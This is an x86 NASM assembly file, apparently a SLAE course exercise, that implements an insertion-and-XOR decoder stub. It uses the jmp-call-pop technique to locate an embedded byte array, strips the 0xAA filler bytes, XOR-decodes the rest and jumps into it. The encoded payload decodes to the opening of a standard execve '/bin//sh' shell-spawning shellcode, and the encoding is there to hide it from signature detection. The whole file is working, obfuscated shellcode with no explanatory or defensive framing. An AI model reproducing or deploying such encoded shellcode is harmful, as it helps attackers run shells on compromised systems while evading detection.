; Filename: insertion-decoder.nasm
; Author: Eric Van Zutphen
; x86 ASM XOR Insertion Decoder
; SLAE ID: SLAE - 1140

global _start

section .text

_start:

        jmp short call_shellcode ; jmp call pop method

decoder:

        pop esi ; pop esi on the stack
        lea edi, [esi +1] ; track the 0xaa
        xor eax, eax ; zero out eax
        mov al, 1 
        xor ebx, ebx ; zero out ebx  


decode:

        mov bl, byte[esi + eax] ; points to first 0xaa
        xor bl, 0xaa ; zf flag will mean end of shellcode
        jnz short xorer ; jump to xorer label if not zero
        mov bl, byte [esi + eax +1] ; put shellcode into bl
        mov byte [edi], bl ; mov shellcode into edi
        inc edi ; increase edi
        add al, 2 ; by 2
        jmp short decode ; jmp to decode loop

xorer:

        lea edi, [esi] ; load esi into edi
        mov cl, 0x19; ; move size of shellcode into cl register as counter

xorloop:

        xor byte [esi], 0xAA ; xor esi pointer by 0xAA
        inc esi ; inc esi
        loop xorloop ; loop until finished
        jmp short EncodedShellcode ; jmp to decoded shellcode

call_shellcode:

        call decoder
        EncodedShellcode: db  0x9b,0xaa,0x6a,0xaa,0xfa,0xaa,0xc2,0xaa,0x85,0xaa,0x85,0xaa,0xd9,0xaa,0xc2,0xaa,0xc2,0xaa,0x85,0xaa,0xc8,0xaa,0xc3,0xaa,0xc4,0xaa,
0x23,0xaa,0x49,0xaa,0xfa,0xaa,0x23,0xaa,0x48,0xaa,0xf9,0xaa,0x23,0xaa,0x4b,0xaa,0x1a,0xaa,0xa1,0xaa,0x67,0xaa,0x2a,0xaa, 0xbb, 0xbb
        len equ $-EncodedShellcode